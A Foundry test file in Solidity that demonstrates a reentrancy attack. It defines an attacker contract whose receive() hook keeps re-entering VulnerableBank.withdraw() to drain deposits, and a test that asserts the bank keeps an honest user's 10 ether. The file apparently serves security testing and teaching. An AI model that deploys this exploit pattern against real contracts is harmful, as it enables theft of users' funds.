// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";

// Classic attacker contract
//
contract MaliciousAttacker {
    VulnerableBank public bank;

    constructor(address _target) {
        bank = VulnerableBank(_target);
    }

    // The attacker deposits legitimate funds to satisfy require(balance > 0)
    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    // Triggers the attack
    function attack() external {
        bank.withdraw();
    }

    receive() external payable {
        // Keep reentering while the bank still has funds available
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableBank bank;
    MaliciousAttacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new MaliciousAttacker(address(bank));

        // 1. Simulate a real scenario: a user deposits 10 ether into the bank
        vm.deal(address(0x1), 10 ether);
        vm.prank(address(0x1));
        bank.deposit{value: 10 ether}();
    }

    function test_bank_is_secure() public {
        // 2. The attacker receives 1 ether and deposits it into the bank
        vm.deal(address(attacker), 1 ether);
        attacker.deposit{value: 1 ether}();

        // 3. The attacker triggers the exploit by performing a normal withdrawal
        // and attempts to drain the contract
        attacker.attack();

        // 4. SECURITY CHECK (The bank is expected to be secure)
        // The bank should still contain the honest user's 10 ether.
        // Since the attacker drains the funds, this assertion will FAIL.
        assertEq(
            address(bank).balance,
            10 ether,
            "Peligro de Vulnerabilidad: El banco ha perdido el dinero de los usuarios"
        );
    }
}